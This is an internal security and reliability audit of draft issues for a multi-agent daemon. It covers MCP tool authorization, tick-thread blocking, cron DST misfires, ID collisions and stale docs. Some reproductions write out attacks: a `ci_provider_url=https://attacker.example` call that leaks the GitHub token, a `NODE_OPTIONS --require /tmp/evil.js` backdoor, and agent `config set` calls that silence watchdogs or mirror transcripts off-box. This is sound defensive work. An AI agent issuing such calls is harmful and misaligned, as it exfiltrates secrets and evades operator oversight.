# Deep Audit 2026-06-29 — Phase 4: Issue Drafts (NOT yet filed on GitHub)

> Second-pass independent audit, deeper than PR #2507. Every issue below was **adversarially
> verified against the actual source** (quoted file:line evidence) by a dedicated verification pass;
> speculative red flags that the code actually defends against are listed under
> **§ Refuted** so future audits don't re-raise them. Nothing here overlaps `docs/KNOWN_ISSUES.md`.
>
> **Status: drafts.** Per operator decision (2026-06-29) no GitHub issues are filed until reviewed.
> When approved, each `### AUDIT2-NNN` block maps to one GitHub issue.
>
> **Threat-model note (security items):** the daemon API is a loopback TCP socket gated by a `0600`
> `api.cookie`; agents run as the **same UID** as the daemon, and `params["instance"]` is
> self-declared. So a fully-hijacked agent with shell already has broad power. The security findings
> below matter as (a) **defense-in-depth boundary breaks reachable by a single _documented MCP tool
> call_ — no shell needed**, and (b) tools failing their own stated safety goals. Severities are
> calibrated to that framing.

Severity scale: **Critical** (data loss / secret exfil / daemon death, easily reached) ·
**High** · **Medium** · **Low**. Counts: 1 High-borderline-Critical, 4 High, 11 Medium, 12 Low.

---

## Group A — Security: missing authorization / validation on MCP tools
Shared root cause: the operator gate leaves agents **fully unrestricted in the default `Active`
mode** (`src/api/operator_gate.rs:166-169`), so the only remaining authorization is each tool's
*internal* ACL — which exists for `task`/`decision` but is **absent** for worktree/lifecycle tools
and for sensitive `config`/`ci` parameters.

### AUDIT2-001 — SSRF + GitHub-token exfiltration via `ci watch ci_provider_url`
- **✅ RESOLVED** in `8e89af16` — `host_receives_credentials()` gates token attachment in all 3 providers (SaaS + loopback + `AGEND_CI_TRUSTED_HOSTS`); operator warn at subscribe; test added; ci_watch 252 + handlers::ci 79 green.
- **Severity:** High *(Critical if untrusted/3rd-party agents or self-hosted CI URLs are in scope)*
- **Component:** MCP `ci` tool → daemon CI-watch poller
- **Description:** `ci action=watch` accepts an agent-supplied `ci_provider_url` with **no scheme/host
  validation**, persists it, and the poll loop attaches `Authorization: Bearer <github_token>` to
  **every** request sent to that base URL.
- **Evidence:** `src/mcp/handlers/ci/watch.rs:112-114` (persist, no validation) → `src/daemon/ci_watch/watcher.rs:12-18,24,48,64` (`url_or_default` checks emptiness only) → `src/daemon/ci_watch/provider.rs:107-109,417` (unconditional `req.bearer_auth(token)` keyed on `base_url`). `ci` is `AlwaysAllow` in the operator gate (`operator_gate.rs:75`) and is in the reviewer/planner role subsets.
- **Reproduction:** any agent (even the most-restricted role, even when operator is Away/Sleep) calls `ci action=watch repository=o/r branch=main ci_provider_url=https://attacker.example`. The daemon then sends the forge token to `attacker.example`.
- **Expected:** validate the URL (https + host allowlist) at the MCP boundary; only attach the token to the canonical/known provider host.
- **Actual:** arbitrary attacker-controlled host receives the GitHub Bearer token.
- **Suspected root cause:** auth resolver is unconditional on `base_url`; no URL validation at the tool boundary.
- **Suggested fix:** allowlist-validate `ci_provider_url` in `watch.rs`; gate token attachment to the known provider host. **Apply the same fix to the adjacent identical vector** `task_sweep_config api_base_url` (`src/daemon/task_sweep.rs:675`).
- **Related issues:** none found open (NEW). Adjacent schema-audit lineage: #1502/#1505.

### AUDIT2-002 — Destructive worktree/lifecycle tools have no per-caller ownership ACL
- **✅ RESOLVED** (conservative ACL + orchestrator exception, per operator decision; see Audit2 Tracker) — `force_release_worktree` and `delete_instance` now require an identified caller to be the target itself or its team orchestrator (`teams::is_orchestrator_of`); anonymous/operator-direct callers keep authority. `delete_instance` adapter threaded `ha`→`has` for the sender. Tests `force_release_denies_non_owner_non_orchestrator_audit2_002`, `delete_instance_denies_non_owner_non_orchestrator_audit2_002`; force_release 23 + instance_state 27 + handlers 119/89 green. **AUDIT2-002b (repo merge)** deferred — PR-merge has no instance-ownership model and is already CI-green-gated; a per-caller ACL there needs a clearer ownership definition.
- **Severity:** Medium
- **Component:** MCP `force_release_worktree`, `delete_instance`, `repo merge`
- **Description:** `force_release_worktree` takes its **target** from `args["instance"]` and ignores
  the caller identity; the only guard is a path-pool containment check, not ownership. Any agent can
  force-release **another** agent's worktree, discarding its uncommitted work.
- **Evidence:** `src/mcp/handlers/force_release/mod.rs:44-52` (`_sender` ignored; target from args), `:77-89` (path-pool guard only), `:101-110` (`git worktree remove --force`). Permitted in default Active mode (`AbsolutelyNever` only in Away/Sleep — `operator_gate.rs:108`). Same args-named-target-without-ACL pattern in `delete_instance` (`src/mcp/handlers/instance_state/lifecycle.rs`) and `repo merge`.
- **Reproduction:** agent A calls `force_release_worktree instance=agentB branch=feature/x` → B's worktree is rebased/cleaned/removed.
- **Expected:** require the caller to be the worktree's bound holder (or its orchestrator) before a destructive op on it.
- **Actual:** cross-agent destruction with zero per-caller authorization.
- **Suggested fix:** add an ownership/orchestrator check against `sender` for `force_release_worktree`, `delete_instance`, `repo merge`.
- **Related:** none open (NEW).

### AUDIT2-003 — Security/observability gates are agent-settable via `config set` in default mode
- **✅ RESOLVED** (see Audit2 Tracker) — the operator gate now blocks agent `config set` of `progress_mode`, `idle_watchdog_enabled`, `hang_auto_recovery_enabled`, `usage_limit_propagation_enabled` in **all** modes (like `mode set`); benign UI keys stay agent-settable. Test `agent_cannot_set_safety_config_keys_in_active_audit2_003`; operator_gate 14 green. (Narrow, surgical slice of the #1339 operator-mode root.)
- **Severity:** Medium
- **Component:** MCP `config` → `runtime_config`
- **Description:** `config set` is correctly allowlisted (unknown keys rejected) — but the allowlist
  **includes** security-relevant gates that any agent can flip fleet-wide in the default Active mode:
  `progress_mode` (value `1` = "mirror", documented **"⚠ EXFILTRATION SURFACE — sends the FULL
  assistant output stream off-box"**), `idle_watchdog_enabled`, `hang_auto_recovery_enabled`,
  `usage_limit_propagation_enabled`.
- **Evidence:** `src/runtime_config.rs:235-318` (allowlisted `set`), `:86-92` (exfil warning on `progress_mode`), `:169-171` (code self-acknowledges "the default flips watchdog/recovery gates and could silence alerts an injected agent would want silenced"). Operator gate blocks `config set` only in Away/Sleep (`operator_gate.rs:86-89`); Active (default) returns `Ok` for all agent ops (`:167`). `progress_mode` is global.
- **Reproduction:** agent calls `config action=set key=idle_watchdog_enabled value=false` (silence stall alerts) or `key=progress_mode value=1` (fleet-wide transcript mirroring).
- **Suggested fix:** classify `progress_mode`, `*_watchdog_*`, `hang_auto_recovery_enabled` as operator-only regardless of operator mode.
- **Related:** none open (NEW).

### AUDIT2-004 — `SENSITIVE_ENV_KEYS` deny-list omits interpreter-injection vars
- **✅ RESOLVED** (Low-Medium; see Audit2 Tracker) — added `NODE_OPTIONS`, `GIT_SSH_COMMAND`, `BASH_ENV`, `ENV`, `PYTHONSTARTUP`, `PERL5OPT`, `RUBYOPT`, `DYLD_FRAMEWORK_PATH`/`DYLD_FALLBACK_FRAMEWORK_PATH` to the spawn deny-list; extended `sensitive_env_keys_covers_known_dangerous`; agent env tests green.
- **Severity:** Medium
- **Component:** `src/agent/mod.rs` spawn env filtering + `create_instance`
- **Description:** The deny-list **correctly** blocks `LD_PRELOAD`/`LD_*`/`DYLD_*`, but **misses**
  interpreter-level code-injection vars that achieve the same effect for the backends agend actually
  runs: `NODE_OPTIONS` (Claude Code / opencode are Node apps), `GIT_SSH_COMMAND` (the daemon runs
  git constantly), `BASH_ENV`, `PYTHONSTARTUP`, `PERL5OPT`, `RUBYOPT`. `create_instance` accepts an
  agent-supplied `env` object that is spawned **and persisted to `fleet.yaml`** (survives restart).
- **Evidence:** `src/agent/mod.rs:171-176` (list — LD_* present, the above absent), `:931-948` (drop at spawn), `src/mcp/tools.rs:111` + `src/mcp/handlers/instance_state/spawn.rs:131` (agent-supplied `env`).
- **Reproduction:** `create_instance … env={"NODE_OPTIONS":"--require /tmp/evil.js"}` → code runs in the spawned backend and is persisted to fleet.yaml (backdoor).
- **Suggested fix:** add `NODE_OPTIONS`, `GIT_SSH_COMMAND`, `BASH_ENV`, `ENV`, `PYTHONSTARTUP`, `PERL5OPT`, `RUBYOPT`, `DYLD_FRAMEWORK_PATH`/`DYLD_FALLBACK_FRAMEWORK_PATH` to `SENSITIVE_ENV_KEYS`.
- **Related:** lineage of credential-isolation work #1440.

### AUDIT2-005 — `task metadata_set` accepts unbounded JSON (record/log bloat)
- **✅ RESOLVED** (see Audit2 Tracker) — `handle_metadata_set` rejects a `metadata_value` over a 64 KiB cap (`metadata_value_too_large`); test `metadata_set_rejects_oversized_value_audit2_005`; tasks 164 green.
- **Severity:** Low
- **Component:** `src/tasks/handler.rs`
- **Description:** `handle_metadata_set` enforces presence + owner ACL but caps neither value size nor
  key count; the value is appended verbatim to the append-only event log and stored in the task's
  `metadata` map. Bounded to the caller's own tasks, hence Low.
- **Evidence:** `src/tasks/handler.rs:1260-1308` (no size/count cap; `value=v.clone()` at :1278 → `TaskEvent::MetadataSet` append :1296-1302); compaction (`src/tasks/board_router.rs:51-98`) covers only `task_index.jsonl`.
- **Suggested fix:** cap serialized `metadata_value` length + per-task key count.

> **Known/accepted (not a new issue):** cross-agent impersonation via the self-declared
> `params["instance"]` (a hijacked agent with shell can read the same-UID `0600` cookie and forge
> the instance name to defeat role-subset + `can_mutate_*` ACLs; it **cannot** claim operator
> authority — transport-gated). Explicitly accepted in code at `operator_gate.rs:151-153` / #1575.

---

## Group B — Reliability: blocking I/O on the daemon tick thread
Shared root cause: notification delivery (telegram `block_on`) and PTY inject run **inline on the
single main tick thread**, so a slow/stalled subscriber delays every per-tick handler for the whole
fleet.

### AUDIT2-006 — Event-bus fan-out is synchronous on the tick thread (no timeout/backpressure)
- **Severity:** Medium
- **Component:** `src/daemon/event_bus.rs` + tick loop
- **Description:** `emit` runs all subscribers synchronously on the caller's (tick) thread with no
  per-subscriber timeout. Producers emit on the main tick thread (cron fire, member-state changes,
  decision-timeout, etc.) and subscribers do blocking I/O (telegram `block_on`, PTY inject up to 5s).
- **Evidence:** `src/daemon/event_bus.rs:258-285` (synchronous `for sub in &subs`), `src/daemon/cron_tick.rs:131,234-255`, `src/channel/telegram/notify.rs:92` (`block_on_value(... Bot::new ... req.send().await)`, no explicit request timeout).
- **Reproduction:** Telegram API black-hole / network stall while any cron fire or member-state-change event is emitted → the whole tick (hang detection, recovery dispatcher, crash handling) blocks for the subscriber's full duration.
- **Suggested fix:** dispatch subscriber delivery on a bounded worker queue, or wrap each `sub(&event)` in a watchdog timeout; at minimum give the notify `Bot` an explicit `reqwest` request timeout.
- **Related:** mitigations already present (#1745 panic isolation + lock-drop-before-dispatch).

### AUDIT2-007 — Crash-event dispatch arm is NOT panic-isolated → daemon death
- **✅ RESOLVED** (Low-Medium; see Audit2 Tracker) — wrapped the `AgentExitEvent` match in `catch_unwind`, mirroring the #1002 per-tick guard; a panic in crash/clean-exit/stage2 handling now logs and the loop continues instead of unwinding `run_core`. supervisor 99 + crash_respawn 4 green.
- **Severity:** Medium
- **Component:** `src/daemon/mod.rs` run_core
- **Description:** Per-tick handlers run under `run_handlers_with_panic_guard` (`catch_unwind`,
  #1002), but the `AgentExitEvent` match (`handle_clean_exit`/`spawn_stage2_thread`/
  `handle_crash_respawn`) runs **unguarded** on the main loop thread. A panic there (notify
  `block_on`, `escalation_persist`, fleet resolve) unwinds `run_core` and the daemon exits.
- **Evidence:** guarded per-tick at `src/daemon/mod.rs:1036`; **unguarded** crash arm at `:1049-1059`.
- **Suggested fix:** wrap the crash-event match in the same `catch_unwind` guard for symmetry.
- **Related:** asymmetry with the documented #1002 isolation.

### AUDIT2-008 — Recovery Stage-2 notify storm on a full crash channel
- **✅ RESOLVED** (Low-Medium; see Audit2 Tracker) — added `HealthTracker::last_stage2_notify_at`; the stage-2 fire path now notifies at most once per 5-min backoff while stuck in `Stage2Eligible` (reset on a successful fire) instead of every ~10s tick. recovery_dispatcher 23 + health 53 green.
- **Severity:** Medium
- **Component:** `src/daemon/per_tick/recovery_dispatcher.rs`
- **Description:** When the bounded(64) `crash_tx` channel is persistently full, `handle_stage2_fire`
  calls `notify_stage2_fire` (telegram, on the main thread) **before** the `try_send` on **every
  tick**, and the notify body embeds ever-changing `silent_ms`/`prod_ms` that **defeats telegram
  dedup** → operator gets a telegram every ~10s per hung agent, and the per-tick `block_on` stalls
  the tick (compounds AUDIT2-006).
- **Evidence:** `src/daemon/per_tick/recovery_dispatcher.rs:539-577` (notify before try_send each tick), `:657-666` (changing body defeats dedup), channel `bounded(64)` at `src/daemon/mod.rs:1231`. (The bare retry itself is documented/intended — `docs/RECOVERY-STAGES.md:94-95`.)
- **Reproduction:** sustained crash/restart load fills the 64-slot channel with ≥1 agent `Stage2Eligible` and `hang_auto_recovery_enabled` on.
- **Suggested fix:** fire `notify_stage2_fire` once on entry to `Stage2Eligible`, add retry backoff, make the notify body dedup-stable.
- **Related:** also crash-respawn notify blocks the main loop before the respawn worker spawns (`src/daemon/crash_respawn.rs:124-133,154-169`).

---

## Group C — Reliability: silent CI / schedule misfires (untested edge bands)

### AUDIT2-009 — CI rerun-to-green is silently swallowed with ≥2 workflows → broken reviewer handoff
- **Severity:** High *(silent)*
- **Component:** `src/daemon/ci_watch/poller.rs`
- **Description:** On a same-sha failure where the failing workflow has a **lower** `run_id` than a
  passing sibling, dedup advances the baseline to the **max-id sibling**. A later
  `gh run rerun` of the failing workflow (id unchanged, attempt bumped, conclusion → success) is then
  hard-dropped by `if run.id < threshold { return None }` **before** any attempt/conclusion check.
  Result: no `[ci-pass]`, no `[ci-ready-for-action]`, and `record_ci_result` (pr_state green) never
  runs → the `next_after_ci` reviewer handoff silently breaks. Trips ~half the time with ≥2
  workflows (run-id ordering is arbitrary).
- **Evidence:** `src/daemon/ci_watch/poller.rs:666-669` (hard `run.id < threshold` drop), `:1677-1685,2043,2053-2055` (`max_notified_id` anchors baseline to the max-id sibling), `#1859 Fix B`'s `attempt_advanced` can't rescue it. Single-workflow rerun **works** (`:677-683,741-743`) and is the only tested case (`poller_tests.rs`).
- **Reproduction:** PR with 2+ workflows where the lower-id one fails; rerun it to green → no notification, handoff stalls.
- **Suggested fix:** track `last_notified_run_attempt`/baseline **per-workflow**; don't let `run.id < threshold` hard-drop a run whose `run_attempt` advanced.
- **Related:** prior context #1267 (CLOSED, "ci_watch dropped after CI failure — rerun requires manual re-subscribe"); #1859 (attempt tracking).

### AUDIT2-010 — Cron schedules double/multi-fire on DST fall-back, miss on spring-forward
- **✅ RESOLVED** (fall-back storm; see Audit2 Tracker) — `is_due_in_tz` now bounds the window in UTC (`take_while(<=now_utc).any(>last_check_utc)`); fold-hour cron fires once per real occurrence (verified by standalone DST repro: 180→2 fires) instead of ~180×; test `ny_dst_fall_back_fold_hour_cron_does_not_storm_audit2_010`; cron_tick 30 + schedules 29 green. *Spring-forward skipped-hour miss left as-is (firing a non-existent local time is a separate behaviour choice).*
- **Severity:** Medium
- **Component:** `src/daemon/cron_tick.rs`
- **Description:** `is_due_in_tz` bounds only the **upper** edge (`...take(1).any(|next| next <= now_local)`)
  with **no `next > last_check_local` lower-bound recheck**. During a DST fall-back, `cron 0.16`
  returns the repeated hour's earlier ambiguous instant first (UTC precedes `last_check`), so a cron
  in the fold hour (e.g. `30 1 * * *`) re-fires on **every tick** across the repeated window.
  Symmetrically, a cron in the spring-forward skipped hour silently misses that day.
- **Evidence:** `src/daemon/cron_tick.rs:443-446` (no lower bound). One-shot replay is **safe/refuted** (absolute RFC3339 + UTC compare, atomic disable — `src/schedules.rs:256-303,411-416`). DST tests all use 9 AM (`cron_tick.rs:571-621`) — the transition band is untested.
- **Reproduction:** create `schedule cron="30 1 * * *" timezone=America/New_York`; run the daemon across the November fall-back 01:30 fold.
- **Suggested fix:** add a `next > last_check_local` lower-bound guard in `is_due_in_tz`; optionally shift spring-forward misses to the post-transition instant.
- **Related:** none open (NEW).

---

## Group D — Correctness: ID minting & state-file atomicity

### AUDIT2-011 — Colliding task IDs at the un-audited `send(kind=task)` auto-create site → silent task loss
- **✅ RESOLVED** (adjudicated **Low** — single-process daemon path, collision not currently reachable, but the inconsistency + false-green guard are real; see Audit2 Tracker) — `messaging.rs` now mints `t-<ts>-<pid>-<seq>` matching `handle_create`; the `task_id_has_process_unique_component_tasks` guard now covers **both** mint sites so a future multi-process regression fails the test. tasks::handler 27 + messaging 55 green.
- **Severity:** High
- **Component:** `src/api/handlers/messaging.rs` (auto-create), tasks event log
- **Description:** The audited `task create` path mints a process-unique `t-{ts}-{pid}-{seq}` id, but
  the parallel `send(kind=task)` auto-create site mints a **two-segment** `t-{ts}-{seq}` with **no
  pid** and a per-process counter that starts at 0 — exactly the pre-fix collision form the
  `handler.rs` comment warns about. Two processes minting in the same microsecond produce the same
  id; replay's `or_insert_with` silently keeps the first and **drops the second task** (distinct
  title/owner/branch) even though the call "succeeded".
- **Evidence:** `src/api/handlers/messaging.rs:186-190` (`AUTO_TASK_SEQ` from 0, `t-{ts}-{seq}`, no pid; call site `:697`); contrast the fixed path `src/tasks/handler.rs:69-87`. The regression guard `task_id_has_process_unique_component_tasks` (`src/tasks/handler/review_repro_tasks.rs:166-197`) only greps `handler.rs` → **false green** while messaging stays vulnerable. Replay drop at `src/task_events.rs:820+`.
- **Reproduction:** two concurrent `send kind=task task_id=""` from two processes (operator + daemon dispatch, or two MCP server processes) within the same wall-clock microsecond.
- **Suggested fix:** add `{pid}` (or a UUID/random suffix) at `messaging.rs:190`; widen the regression guard to cover all mint sites.
- **Related:** none open (NEW); same bug class as the fix that produced `handler.rs:78-85`.

### AUDIT2-012 — `runtime-config.json` is written non-atomically and unlocked
- **✅ RESOLVED** (Low-Medium; see Audit2 Tracker) — `set()` now takes a cross-process file lock around the whole read-check-write and writes via `store::atomic_write` (tmp+rename); a crash can no longer leave truncated JSON that reverts to defaults, and concurrent sets serialize. runtime_config 15 green (incl. the #1990 version-check).
- **Severity:** Medium
- **Component:** `src/runtime_config.rs`
- **Description:** `set()` writes with plain `std::fs::write` (not `store::atomic_write`) and holds no
  file lock. A crash mid-write leaves truncated JSON; two concurrent `set()` calls lost-update each
  other. A corrupt file at **next startup** silently reverts to defaults — flipping watchdog/recovery
  gates (the exact failure `#1576` aimed to prevent). (The suspected in-memory/disk ordering desync
  is **refuted** — disk write precedes the memory update and returns early on failure.)
- **Evidence:** `src/runtime_config.rs:340-342` (`std::fs::write`, no lock; mem update only on success).
- **Suggested fix:** use `store::atomic_write` + serialize `set()` under a config flock.
- **Related:** #1576 (keep-last-good reload).

### AUDIT2-013 — Skills staging dir is shared by allowlist digest and rebuilt without a lock
- **✅ RESOLVED** (Low-Medium; see Audit2 Tracker) — `stage_filtered_source` now takes a per-digest file lock around the remove/rebuild, so two concurrent same-allowlist installs serialize instead of B's `remove_dir_all` wiping A's half-built tree (the ENOENT boot-abort). Digest-keyed path + GC exclusion unchanged. skills 31 green.
- **Severity:** Medium
- **Component:** `src/skills.rs`
- **Description:** `stage_filtered_source` builds at a path keyed **solely** by the allowlist digest
  (no pid/nonce) via check→`remove_dir_all`→mkdir→populate with **no lock**. Two concurrent installs
  with the same allowlist (common: same-profile fleet instances booting together) collide: agent B's
  `remove_dir_all` deletes agent A's half-populated tree → A's `copy_dir_recursive` hits ENOENT →
  `?` **aborts A's boot with missing skills**; a running agent's symlink into that dir sees skills
  vanish/reappear. `create_dir_all` returns Ok on EEXIST, so the collision is silent.
- **Evidence:** `src/skills.rs:403-429` (shared `stage` path, no lock). Concurrent call sites: `src/daemon/mod.rs:1900,2120`, `src/daemon/crash_respawn.rs:297`, `src/app/pane_factory.rs:296`. (Unbounded stage growth **refuted** — `cleanup_stale_stages` GCs at `:457-508`.)
- **Reproduction:** boot a fleet with ≥2 instances declaring identical `skills:` allowlists.
- **Suggested fix:** stage into `<digest>.<pid>.<nonce>` then atomic `rename`, or take a per-digest flock.
- **Related:** none open (NEW).

### AUDIT2-014 — Cross-board dependency claim race (multi-board deployments only)
- **Severity:** Low
- **Component:** `src/tasks/mod.rs`, `src/event_log.rs`
- **Description:** Task claim re-validates dependencies but reads a **foreign** board lock-free while
  holding only the **local** board lock. Between the lock-free `replay_at(B)` (dep `Done`) and the
  durable `Claimed` commit to board A, a concurrent writer to board B can reopen/cancel the dep; the
  task is then claimed with the dep no longer done, and claimed tasks are never re-evaluated →
  permanent. Same-board deps are race-free.
- **Evidence:** `src/event_log.rs:103-108` + `src/task_events.rs:1290` (local-only lock), `src/tasks/mod.rs:184-194` (`DepResolver::status_of`→`replay_at`, no lock — `task_events.rs:1636-1666`), early-return on claimed `src/tasks/mod.rs:207-214`.
- **Suggested fix:** lock the foreign board(s) during the claim precondition, or re-validate cross-board deps on a daemon tick.
- **Related:** multi-board feature #2117.

### AUDIT2-015 — Missing parent-directory fsync in hand-rolled tmp+rename paths
- **✅ RESOLVED** (Low-Medium; see Audit2 Tracker) — `inbox/disk.rs` recover-rewrite routed through `store::atomic_write` (dir-fsync included); added `store::fsync_parent_dir` (Unix; no-op on Windows) and called it after the hand-rolled renames in `inbox/storage.rs` (4 sites) and `task_events.rs`. inbox 176 + task_events 49 green.
- **Severity:** Low (durability)
- **Component:** `src/inbox/*`, `src/task_events.rs`
- **Description:** Unlike `store::atomic_write` (which fsyncs the parent dir), the inbox module's
  tmp+rename sites and `recover_half_writes_at` fsync the file but never the parent dir; power-loss
  right after `rename` can lose the rename. Bounded (inbox degrades to at-least-once redelivery; the
  `reclaim` TTL covers it; leftover `.tmp` cleaned at boot).
- **Evidence:** `src/inbox/storage.rs:569`, `src/inbox/disk.rs:144`, `src/task_events.rs:1947-1960`.
- **Suggested fix:** route these through `store::atomic_write`, or add a parent-dir fsync.

---

## Group E — TUI state-machine correctness

### AUDIT2-016 — `close_tab` mis-points `active` when a tab left of active is removed
- **✅ RESOLVED** (see Audit2 Tracker) — added `if self.active > idx { self.active -= 1 }` to `close_tab`; test `close_tab_left_of_active_keeps_focus_audit2_016`; layout suite 60 green.
- **Severity:** Medium
- **Component:** `src/layout/mod.rs`
- **Description:** `close_tab(idx)` removes the tab and only fixes `active` when it ran past the end
  (`active >= len`). It lacks the `if active > idx { active -= 1 }` branch, so when a tab **left of**
  the focused one is removed (via fleet/team sync, which passes an arbitrary found index, not
  `active`), `active` keeps its old value and now indexes the tab that shifted into its place →
  subsequent keystrokes route to the wrong tab. The keyboard close path is unaffected (it passes
  `idx == active`).
- **Evidence:** `src/layout/mod.rs:220` (`close_tab`), programmatic callers `src/app/tui_events.rs:541,589`; input routes through `active_tab_mut()` (`src/app/mod.rs:1574`).
- **Reproduction:** tabs `[A,B,C,D]`, focus `C`; an agent in tab `A` is removed by fleet sync → tabs `[B,C,D]` but `active` still `2` → now `D`; keystrokes go to `D`.
- **Suggested fix:** add `if self.active > idx { self.active -= 1; }` before the `>= len` clamp.
- **Related:** none open (NEW).

### AUDIT2-017 — `scroll_offset` is never re-clamped when scrollback shrinks → blank pane
- **✅ RESOLVED** (see Audit2 Tracker) — added `Pane::clamped_scroll_offset()`; render uses it (no blank rows), and the down-scroll branch clamps to `max` first (instant recovery); test `clamped_scroll_offset_clamps_stale_offset_audit2_017`; pane 17 + render 76 green.
- **Severity:** Medium
- **Component:** `src/app/mod.rs`, `src/vterm.rs`
- **Description:** Up-scroll clamps `scroll_offset` to `scroll_max`, but render clamps only to
  `i32::MAX`, and the offset is reset to 0 **only** on instance replace — never on resize, zoom,
  alt-screen entry, or child clear. When any of those shrink `max_scroll` below a held offset, the
  visible region goes blank; scrolling **down** uses `saturating_sub` and won't recover, only a
  single scroll-**up** snaps it back (counter-intuitive).
- **Evidence:** up-scroll clamp `src/app/mod.rs:1789`; render clamp-to-i32::MAX only `src/vterm.rs:549,614`; `max_scroll` `src/vterm.rs:728`; reset-on-replace only `src/app/commands.rs:580`. Distinct from the accepted 10k selection-drift (`src/layout/pane.rs:83-93`).
- **Reproduction:** scroll a pane up ~500 lines, then run `vim`/`less`/`htop` in it (alt-screen, `max_scroll→0`) or press `Ctrl+B z` to zoom.
- **Suggested fix:** clamp the render offset to `pane.scroll_max()` and/or re-clamp on geometry/mode change.
- **Related:** none open (NEW).

---

## Group F — Documentation ↔ implementation drift
Shared root cause: **`docs/USAGE.md` is stale** (CLI.md / FEATURE-tui.md are mostly correct). Low
severity individually, but they actively mislead first-run users.

### AUDIT2-018 — `USAGE.md` documents commands & a binary that don't exist
- **✅ RESOLVED** (see Audit2 Tracker) — `USAGE.md`: removed the nonexistent `agend-supervisor` binary (replaced with real `agend-git`/`agend-mcp-bridge` + in-process-supervision section); dropped `demo`/`upgrade`/`fleet start-stop`/`daemon`/`test`, redirected `daemon`→`start --agents`, `test`→`verify --quick`; fixed `--detached`→`--foreground` (now default).
- **Severity:** Medium (one item) / Low (rest)
- **Component:** docs
- **Description / Evidence:**
  - **`agend-supervisor` binary** — presented as a shippable binary with a `--home` flag and in the
    architecture diagram (`docs/USAGE.md:8,88-101,106`), but **no such bin target exists** (`src/bin/`
    has only `agend-git`, `agend-mcp-bridge`; `Cargo.toml` has no `[[bin]]`; the only supervisor is
    the in-process `src/daemon/supervisor.rs`). Running `agend-supervisor` → command not found. *(Medium — most material.)*
  - **`demo`** (`docs/CLI.md:179-184` full section + `USAGE.md:227`), **`upgrade`** (`USAGE.md:230`),
    **`fleet start/stop`** (`USAGE.md:224`), **`daemon <name:cmd>`** (`USAGE.md:218`), **`test [suite]`**
    (`USAGE.md:232`) — none exist in the clap `Commands` enum (`src/main.rs:272-469`); each → "unrecognized
    subcommand", exit 2. `daemon`→`start --agents`, `test`→`verify --quick`.
  - **`start --detached`** (`docs/CLI.md:33,36`; `USAGE.md:31,37`) — the flag is `--foreground`
    (`src/main.rs:282-283`) and the default flipped to detached; `--detached` → "unexpected argument", exit 2.
- **Suggested fix:** rewrite `USAGE.md` to match the real surface (delete the dead commands/binary; point `daemon`→`start --agents`, `test`→`verify --quick`, `--detached`→default + `--foreground` opt-out).

### AUDIT2-019 — `USAGE.md` TUI keybinding table is wrong
- **✅ RESOLVED** (see Audit2 Tracker) — synced the tab/pane keybind tables to `keybinds.rs`: new tab `c` (was `n`), next/prev `n`/`p` (was `Tab`/`Shift+Tab`), goto `0-9`, close tab `&` (was `X`), splits `"`/`%` (was `|`/`-`), and `m`→Monitor view (was "future mirror mute").
- **Severity:** Low
- **Component:** docs
- **Evidence:** `docs/USAGE.md` vs `src/keybinds.rs`: `Ctrl+B n` listed as New tab (actually NextTab; new = `c`), `Ctrl+B Tab/Shift+Tab` (unbound), `Ctrl+B |`/`-` splits (unbound; real splits `"`/`%`), `Ctrl+B X` close tab (actually `&`; `x` = ClosePane), `Ctrl+B m` "future mirror mute" (actually ShowMonitor). `docs/CLI.md:27` and `docs/FEATURE-tui.md` are correct.
- **Suggested fix:** sync the table to `keybinds.rs` or delete it and link to FEATURE-tui.md.

### AUDIT2-020 — Documented knobs that no code reads (silent no-ops)
- **✅ RESOLVED** (env var; see Audit2 Tracker) — removed the dead `AGEND_TURN_SENTINEL_SHADOW` row (with its fabricated source citations) from `env-vars.md` and fixed the `AGEND_RECOVERY_SHADOW` sibling reference. *(task.duration sub-item was dropped during adjudication — `duration` is a real `watchdog` snooze param.)*
- **Severity:** Low–Medium
- **Component:** docs
- **Evidence:**
  - **`AGEND_TURN_SENTINEL_SHADOW`** (`docs/env-vars.md:178`) — documented with **fabricated source
    citations**; the env string and the named functions appear in **zero** `.rs` files. Setting it
    does nothing. (Sibling `AGEND_RECOVERY_SHADOW` *is* implemented.) Remove or re-implement.
  - **`task duration` MCP param** (`docs/MCP-TOOLS.md:10`) — not in the `task` schema (only `due_at`/
    `eta_secs`) and read nowhere; silently dropped. Point users to `eta_secs`/`due_at`.

---

## § Refuted — suspected issues the code actually defends against
(Recorded so future passes don't re-raise them.)

- **Role-subset fail-open on typo/None** — `RoleKind` is strict deny-unknown; a typo fails fleet load and `role_kind_for_instance` fails **closed** (`mcp_proxy.rs:254-264`). `None`→all-open is documented opt-in (#2344).
- **Decision ACL author spoof** — author is daemon-derived; `can_mutate_decision` never reads `args["author"]` (`decisions.rs:103-111`).
- **`send` invariants only log** — they **reject** with `code: task_id_required` (`comms_gates/anti_stall.rs:30-50`).
- **Worktree release lost-update / double-release** — `release()` holds the same per-agent binding flock + `atomic_write` marker (`worktree_pool.rs:116-139`); fixed (#worktree-git-3).
- **Inbox `delivering` stuck-forever** — real 600 s `RECLAIM_TTL` fail-safe (`inbox/storage.rs:52,1420-1444`).
- **`task_events` compaction crash** — fully under the append flock, archive-before-shrink, `atomic_write`, seq-idempotent replay (`task_events.rs:2000-2038`). Crash-safe.
- **`runtime_config` set mem/disk ordering desync** — disk first, mem only on success (the **lock/atomicity** gap in AUDIT2-012 is the real residual).
- **focus_id orphan panic / selection garbage / palette overrun / goto-tab OOB / modal-stuck / resize-mid-drag** — all Option-resolved or bounds-checked; no panic. ConfirmClose only `y`/`Y` confirms (fail-safe).
- **Image paste #2443 off-by-one / TTL premature delete** — uses `.find()`, cleanup-before-write, TTL 3600 s, future-mtime fail-safe.
- **`task activity` unimplemented** — implemented + tested (`handler.rs:52`). **`deployment teardown` ambiguous** — `name` is required (`deployments.rs:531-543`). **ephemeral `workflow_id` orphan leak** — reaped (`ephemeral_tracking.rs:616`). **Schema forward-compat brick** — real asymmetry but accurately documented in `COMPATIBILITY.md:40-44` (intentional).
- **Restart successor probe/flock race** — two recheck gates (`mod.rs:217-236`, `:1106-1140`) catch successor death; only the documented microsecond pre-`exit` residual remains.
- **Boot-sweep purging live daemon** — env-gated, telemetry-default, identity + start-token guarded. **Global notify cooldown** — actually per-agent (`health.rs:581,658`).
- **One-shot schedule DST replay** — absolute-instant + UTC compare, atomic disable; DST-immune.

## § Uncertain / needs more investigation
- **`task_events` compaction unbounded growth on persistent write failure** (disk full / EPERM): compaction failure is warn-only (`task_events.rs:2062-2064`); the hot log then grows past the high-water mark and every append re-reads an ever-larger file into memory. Not a correctness bug, but a memory/IO amplification while the fault persists.
